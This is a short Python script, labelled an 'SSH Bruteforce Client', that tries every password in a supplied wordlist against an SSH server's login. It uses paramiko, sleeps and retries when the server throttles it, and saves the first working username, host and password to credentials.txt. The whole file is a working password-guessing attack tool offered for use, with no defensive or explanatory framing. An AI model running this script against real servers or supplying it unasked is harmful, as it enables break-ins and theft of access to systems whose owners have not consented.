import paramiko
import socket
import time

# Colorama for terminal colours
from colorama import init, Fore

init() # Initialize Colorama & define colours to use

RED   = Fore.RED
GREEN = Fore.GREEN
BLUE  = Fore.BLUE
RESET = Fore.RESET

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient() # Start Paramiko SSH client
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Add host save
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}") # When host is unreachable
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}") # Invalid authentication
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}") # Requests occurring too quickly
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN}[+] Found combination of:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}") # Success!
        return True
        
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Client")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server")
    parser.add_argument("-P", "--passlist", help="File that contains password list.")
    parser.add_argument("-u", "--user", help="Host username.")
    
    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    passlist = open(passlist).read().splitlines() # Read file
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            open("credentials.txt", "w").write(f"{user}@{host}:{password}") # Save combination to a file
            break